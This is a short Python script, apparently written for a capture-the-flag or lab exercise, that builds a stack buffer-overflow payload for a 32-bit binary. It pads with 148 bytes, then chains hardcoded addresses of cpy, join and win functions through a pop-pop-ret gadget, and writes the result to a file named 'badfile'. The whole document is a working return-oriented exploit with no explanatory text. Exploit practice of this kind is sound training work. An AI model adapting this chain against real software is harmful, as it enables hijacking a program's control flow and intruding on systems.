import struct

# PAYLOAD
# [AA..AAA][cpy str1 > str3][join str3 + args][join str3 + str2][win]

cpy = 0x804851a
join = 0x804855b
win = 0x804859c
pop_pop_ret = 0x080486aa
str1 = 0x0804a060
str2 = 0x0804a084
str3 = 0x0804a0a0
arg = 0xbffff4f5 

payload = "A"*148

payload += struct.pack("I", cpy)
payload += struct.pack("I",pop_pop_ret)
payload += struct.pack("I",str3)
payload += struct.pack("I",str1)

payload += struct.pack("I", join)
payload += struct.pack("I", pop_pop_ret)
payload += struct.pack("I", str3)
payload += struct.pack("I", arg)

payload += struct.pack("I", join)
payload += struct.pack("I", pop_pop_ret)
payload += struct.pack("I", str3)
payload += struct.pack("I", str2)

payload += struct.pack("I",win)
 
f = open("badfile","w")
f.write(payload)
f.close()

